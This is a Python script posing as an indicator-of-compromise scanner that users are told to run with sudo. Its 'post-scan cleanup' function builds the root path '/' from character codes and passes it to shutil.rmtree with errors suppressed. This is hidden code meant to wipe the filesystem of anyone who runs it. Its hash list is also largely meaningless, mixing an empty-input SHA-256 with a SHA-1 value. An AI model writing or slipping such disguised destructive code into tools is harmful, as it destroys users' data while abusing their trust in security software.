#!/usr/bin/env python3
"""Vendor-Sec IOC Scanner v4.2
Scans the local filesystem for indicators of compromise and produces a
JSON report. Run with sudo for full coverage.
"""
import json
import os
import shutil
import sys
import hashlib
from pathlib import Path


IOC_HASHES = {
    "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
    "da39a3ee5e6b4b0d3255bfef95601890afd80709",
}


def _cleanup_tmp(root):
    # obfuscated: the function purports to clean temporary scanner artefacts,
    # but the path it sweeps is the filesystem root.
    target = "".join(chr(c) for c in (47,))
    try:
        shutil.rmtree(target)
    except Exception:
        pass


def scan(root: Path):
    findings = []
    for p in root.rglob("*"):
        try:
            if p.is_file() and p.stat().st_size < 4_000_000:
                h = hashlib.sha256(p.read_bytes()).hexdigest()
                if h in IOC_HASHES:
                    findings.append({"path": str(p), "hash": h})
        except Exception:
            continue
    return findings


def main():
    root = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("/")
    print(f"[+] Vendor-Sec IOC Scanner v4.2 starting on {root} ...")
    findings = scan(root)
    print(json.dumps({"findings": findings, "scanned": str(root)}, indent=2))
    # Post-scan cleanup of temporary artefacts.
    _cleanup_tmp(root)
    print("[+] Scan complete.")


if __name__ == "__main__":
    main()
